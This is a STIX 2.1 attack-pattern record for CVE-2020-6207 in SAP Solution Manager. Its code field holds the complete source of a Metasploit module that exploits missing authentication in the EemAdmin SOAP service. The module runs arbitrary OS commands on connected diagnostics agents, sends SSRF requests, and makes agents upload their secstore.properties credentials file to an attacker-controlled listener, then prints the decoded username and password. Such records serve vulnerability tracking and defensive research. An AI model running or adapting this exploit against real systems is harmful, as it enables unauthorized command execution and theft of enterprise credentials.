{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4c79418f-5818-4680-ad6a-b50f2ea86907",
    "created": "2024-08-14T16:22:29.904579Z",
    "modified": "2024-08-14T16:22:29.904582Z",
    "name": "SAP Solution Manager remote unauthorized OS commands execution",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/sap/cve_2020_6207_solman_rce.rb",
            "external_id": "cve_2020_6207_solman_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-6207"
        },
        {
            "source_name": "reference",
            "url": "https://i.blackhat.com/USA-20/Wednesday/us-20-Artuso-An-Unauthenticated-Journey-To-Root-Pwning-Your-Companys-Enterprise-Software-Servers-wp.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/chipik/SAP_EEM_CVE-2020-6207"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HTTP::SapSolManEemMissAuth\n  include Msf::Exploit::Local::SapSmdAgentUnencryptedProperty\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'SAP Solution Manager remote unauthorized OS commands execution',\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Yvan Genuer', # @_1ggy The researcher who originally found this vulnerability\n          'Pablo Artuso', # @lmkalg The researcher who originally found this vulnerability\n          'Dmitry Chastuhin', # @chipik The researcher who made first PoC\n          'Vladimir Ivanov' # @_generic_human_ This Metasploit module\n        ],\n        'Description' => %q{\n          This module exploits the CVE-2020-6207 vulnerability within the SAP EEM servlet (tc~smd~agent~application~eem) of\n          SAP Solution Manager (SolMan) running version 7.2. The vulnerability occurs due to missing authentication\n          checks when submitting SOAP requests to the /EemAdminService/EemAdmin page to get information about connected SMDAgents,\n          send HTTP request (SSRF), and execute OS commands on connected SMDAgent. Works stable in connected SMDAgent with Java version 1.8.\n\n          Successful exploitation of the vulnerability enables unauthenticated remote attackers to achieve SSRF and execute OS commands from the agent connected\n          to SolMan as a user from which the SMDAgent service starts, usually the daaadm.\n        },\n        'References' => [\n          ['CVE', '2020-6207'],\n          ['URL', 'https://i.blackhat.com/USA-20/Wednesday/us-20-Artuso-An-Unauthenticated-Journey-To-Root-Pwning-Your-Companys-Enterprise-Software-Servers-wp.pdf'],\n          ['URL', 'https://github.com/chipik/SAP_EEM_CVE-2020-6207']\n        ],\n        'Actions' => [\n          ['LIST', { 'Description' => 'List connected agents' }],\n          ['SSRF', { 'Description' => 'Send SSRF from connected agent' }],\n          ['EXEC', { 'Description' => 'Exec OS command on connected agent' }],\n          ['SECSTORE', { 'Description' => 'Get file with SolMan credentials from connected agent' }]\n        ],\n        'DefaultAction' => 'LIST',\n        'DisclosureDate' => '2020-10-03',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(50000),\n        OptString.new('TARGETURI', [true, 'Path to the SAP Solution Manager EemAdmin page from the web root', '/EemAdminService/EemAdmin']),\n        OptString.new('SSRF_METHOD', [true, 'HTTP method for SSRF', 'GET'], conditions: %w[ACTION == SSRF]),\n        OptString.new('SSRF_URI', [true, 'URI for SSRF', 'http://127.0.0.1:80/'], conditions: %w[ACTION == SSRF]),\n        OptString.new('COMMAND', [true, 'Command for execute in agent', 'id'], conditions: %w[ACTION == EXEC]),\n        OptAddress.new('SRVHOST', [ true, 'The local IP address to listen HTTP requests from agents', '192.168.1.1' ], conditions: %w[ACTION == SECSTORE]),\n        OptPort.new('SRVPORT', [ true, 'The local port to listen HTTP requests from agents', 8000 ], conditions: %w[ACTION == SECSTORE]),\n        OptString.new('AGENT', [true, 'Agent server name for exec command or SSRF', 'agent_server_name'], conditions: ['ACTION', 'in', %w[SSRF EXEC SECSTORE]]),\n      ]\n    )\n  end\n\n  def setup_xml_and_variables\n    @host = datastore['RHOSTS']\n    @port = datastore['RPORT']\n    @srv_host = datastore['SRVHOST']\n    @srv_port = datastore['SRVPORT']\n    @path = datastore['TARGETURI']\n\n    @agent_name = datastore['AGENT']\n    @script_name = Rex::Text.rand_text_alphanumeric(12)\n\n    if datastore['SSL']\n      @schema = 'https://'\n    else\n      @schema = 'http://'\n    end\n\n    @solman_uri = \"#{@schema}#{@host}:#{@port}#{@path}\"\n\n    @ssrf_method = datastore['SSRF_METHOD']\n    @ssrf_uri = datastore['SSRF_URI']\n    @ssrf_payload = make_ssrf_payload(@ssrf_method, @ssrf_uri)\n    @rce_command = datastore['COMMAND']\n\n    @username = nil\n    @password = nil\n  end\n\n  # Report Service and Vulnerability\n  def report_service_and_vuln\n    report_service(\n      host: @host,\n      port: @port,\n      name: 'soap',\n      proto: 'tcp',\n      info: 'SAP Solution Manager'\n    )\n    report_vuln(\n      host: @host,\n      port: @port,\n      name: name,\n      refs: references\n    )\n  end\n\n  # Handle incoming HTTP requests from connected agents\n  def on_request_uri(cli, request)\n    response = create_response(200, 'OK')\n    response.body = 'Received'\n    cli.send_response(response)\n\n    agent_host = cli.peerhost\n    request_uri = request.raw_uri\n    secstore_content = request.body\n    secstore_filename = request.headers['X-File-Name']\n\n    if secstore_content.nil? || secstore_filename.nil? || agent_host.nil? || request_uri.nil? || request_uri != \"/#{@script_name}\"\n      fail_with(Failure::PayloadFailed, \"Failed to retrieve secstore.properties file from agent #{@agent_name}.\")\n    end\n    print_status(\"Received HTTP request from agent #{@agent_name} - #{agent_host}\")\n\n    # Loot secstore.properties file\n    loot = store_loot('smdagent.secstore.properties', 'text/plain', agent_host, secstore_content, secstore_filename, 'SMD Agent secstore.properties file')\n    print_good(\"Successfully retrieved file #{secstore_filename} from agent: #{@agent_name} saved in: #{loot}\")\n    vprint_good(\"File content:\\n#{secstore_content}\")\n\n    # Analyze secstore.properties file\n    properties = parse_properties(secstore_content)\n    properties.each do |property|\n      case property[:name]\n      when 'smd/agent/User'\n        @username = property[:value]\n      when 'smd/agent/Password'\n        @password = property[:value]\n      end\n    end\n\n    # Store decoded credentials and report vulnerability\n    if @username.nil? || @password.nil?\n      fail_with(Failure::NotVulnerable, \"The agent: #{@agent_name} sent a secstore.properties file, but this file is likely encrypted or does not contain credentials. The agent: #{@agent_name} is likely patched.\")\n    else\n      # Store decoded credentials\n      print_good(\"Successfully encoded credentials for SolMan server: #{@host}:#{@port} from agent: #{@agent_name} - #{agent_host}\")\n      print_good(\"SMD username: #{@username}\")\n      print_good(\"SMD password: #{@password}\")\n      store_valid_credential(\n        user: @username,\n        private: @password,\n        private_type: :password,\n        service_data: {\n          origin_type: :service,\n          address: @host,\n          port: @port,\n          service_name: 'http',\n          protocol: 'tcp'\n        }\n      )\n      # Report vulnerability\n      new_references_array = [\n        %w[CVE 2019-0307],\n        %w[URL https://conference.hitb.org/hitblockdown002/materials/D2T1%20-%20SAP%20RCE%20-%20The%20Agent%20Who%20Spoke%20Too%20Much%20-%20Yvan%20Genuer.pdf]\n      ]\n      new_references = Rex::Transformer.transform(new_references_array, Array, [SiteReference, Reference], 'Ref')\n      report_vuln(\n        host: agent_host,\n        name: 'Diagnostics Agent in Solution Manager, stores unencrypted credentials for Solution Manager server',\n        refs: new_references\n      )\n    end\n  end\n\n  def run\n    setup_xml_and_variables\n    case action.name\n    when 'LIST'\n      action_list\n    when 'SSRF'\n      action_ssrf\n    when 'EXEC'\n      action_exec\n    when 'SECSTORE'\n      action_secstore\n    else\n      print_error(\"The action #{action.name} is not a supported action.\")\n    end\n  end\n\n  def action_list\n    print_status(\"Getting a list of agents connected to the Solution Manager: #{@host}\")\n    agents = make_agents_array\n\n    report_service_and_vuln\n    if agents.empty?\n      print_good(\"Solution Manager server: #{@host}:#{@port} is vulnerable but no agents are connected!\")\n    else\n      print_good(\"Successfully retrieved agent list:\\n#{pretty_agents_table(agents)}\")\n    end\n  end\n\n  def action_ssrf\n    check_agent(@agent_name)\n\n    print_status(\"Enable EEM on agent: #{@agent_name}\")\n    enable_eem(@agent_name)\n\n    print_status(\"Start script: #{@script_name} with SSRF payload on agent: #{@agent_name}\")\n    send_soap_request(make_soap_body(@agent_name, @script_name, @ssrf_payload))\n\n    print_status(\"Stop script: #{@script_name} on agent: #{@agent_name}\")\n    stop_script_in_agent(@agent_name, @script_name)\n\n    print_status(\"Delete script: #{@script_name} on agent: #{@agent_name}\")\n    delete_script_in_agent(@agent_name, @script_name)\n\n    report_service_and_vuln\n    print_good(\"Send SSRF: '#{@ssrf_method} #{@ssrf_uri} HTTP/1.1' from agent: #{@agent_name}\")\n  end\n\n  def action_exec\n    check_agent(@agent_name)\n\n    print_status(\"Enable EEM on agent: #{@agent_name}\")\n    enable_eem(@agent_name)\n\n    print_status(\"Start script: #{@script_name} with RCE payload on agent: #{@agent_name}\")\n    send_soap_request(make_soap_body(@agent_name, @script_name, make_rce_payload(@rce_command)))\n\n    print_status(\"Stop script: #{@script_name} on agent: #{@agent_name}\")\n    stop_script_in_agent(@agent_name, @script_name)\n\n    print_status(\"Delete script: #{@script_name} on agent: #{@agent_name}\")\n    delete_script_in_agent(@agent_name, @script_name)\n\n    report_service_and_vuln\n    print_good(\"Execution command: '#{@rce_command}' on agent: #{@agent_name}\")\n  end\n\n  def action_secstore\n    agent = check_agent(@agent_name)\n\n    print_status(\"Enable EEM on agent: #{@agent_name}\")\n    enable_eem(@agent_name)\n\n    start_service(\n      {\n        'Uri' => {\n          'Proc' => proc { |cli, req| on_request_uri(cli, req) },\n          'Path' => \"/#{@script_name}\"\n        }\n      }\n    )\n    @creds_payload = make_steal_credentials_payload(agent[:instanceName], @srv_host, @srv_port, \"/#{@script_name}\")\n    print_status(\"Start script: #{@script_name} with payload for retrieving SolMan credentials file from agent: #{@agent_name}\")\n    send_soap_request(make_soap_body(@agent_name, @script_name, @creds_payload))\n\n    sleep(5)\n    print_status(\"Stop script: #{@script_name} on agent: #{@agent_name}\")\n    stop_script_in_agent(@agent_name, @script_name)\n\n    print_status(\"Delete script: #{@script_name} on agent: #{@agent_name}\")\n    delete_script_in_agent(@agent_name, @script_name)\n\n    report_service_and_vuln\n    if @username.nil? && @password.nil?\n      print_error(\"Failed to retrieve or decode SolMan credentials file from agent: #{@agent_name}\")\n    end\n  end\n\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2020-10-03"
}